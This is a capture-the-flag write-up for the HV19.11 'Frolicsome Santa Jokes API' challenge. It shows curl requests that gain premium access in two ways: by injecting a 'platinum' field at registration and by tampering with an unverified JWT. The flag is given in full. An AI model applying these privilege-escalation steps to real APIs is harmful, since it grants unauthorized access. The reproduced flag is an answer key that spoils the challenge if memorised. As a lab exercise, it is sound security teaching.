# HV19.11 - Frolicsome Santa Jokes API

| Author | Level | Categories |
|---|---|---|
| inik | medium | fun |

## Given
The elves created an API where you get random jokes about santa.

Go and try it here: http://whale.hacking-lab.com:10101

## Approach

For information gathering, I played through the scenario as described.

![API specification](HV19.11_frolicsom_santa_jokes_api.png)

Logging in with a user resulted in a token implementing a JWT: 

```bash
$ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"testuser", "password": "passwordpassword"}'

{"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidGVzdHVzZXIiLCJwbGF0aW51bSI6ZmFsc2V9LCJleHAiOjE1Nzc0Mzc4ODkuMzUzMDAwMDAwfQ.5msTsQB_qqB-samcp4CP4tS2DNWvdgILjpiBm-L_kqM"}
```

JWTs can be decoded: 

```json
{
    "user": {
        "username": "testuser",
        "platinum": false
    },
    "exp": 1577437889.353
}
```

So let's try to bring that `platinum` property to a `true` value.


### One

One variant that was successful was to simply add the property to the registration request of a new user:

```bash
# curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"nothertestuser", "password": "passwordpassword", "platinum": true}'
HTTP/1.1 201 Created
Content-Type: application/json
Content-Length: 37
Server: Jetty(9.4.18.v20190429)

{"message":"User created","code":201}
```

Logging in with that user:
```bash
# curl -i -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username": "nothertestuser", "password":"passwordpassword"}'
HTTP/1.1 201 Created
Content-Type: application/json
Content-Length: 224
Server: Jetty(9.4.18.v20190429)

{"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoibm90aGVydGVzdHVzZXIiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA0Nzg5NC40NzcwMDAwMDB9.3_9QFSTdjMaIOG0DJL7jBKR1-jbbgfKKDIvA2T-2bNo"}
```

And requesting a "random" joke:
```bash
# curl -i -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoibm90aGVydGVzdHVzZXIiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA0Nzg5NC40NzcwMDAwMDB9.3_9QFSTdjMaIOG0DJL7jBKR1-jbbgfKKDIvA2T-2bNo"
HTTP/1.1 201 Created
Content-Type: application/json
Content-Length: 300
Server: Jetty(9.4.18.v20190429)

{"joke":"Congratulation! Sometimes bugs are rather stupid. But that's how it happens, sometimes. Doing all the crypto stuff right and forgetting the trivial stuff like input validation, Hohoho! Here's your flag: HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}","author":"Santa","platinum":true}
```

### Two

It turns out, the API also did not validate the token before using it. So, solving this challenge could have been as simple as decoding the JWT, setting the platinum property to `true` and re-encoding the JWT (with a wrong signature).

## Flag
`HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}`
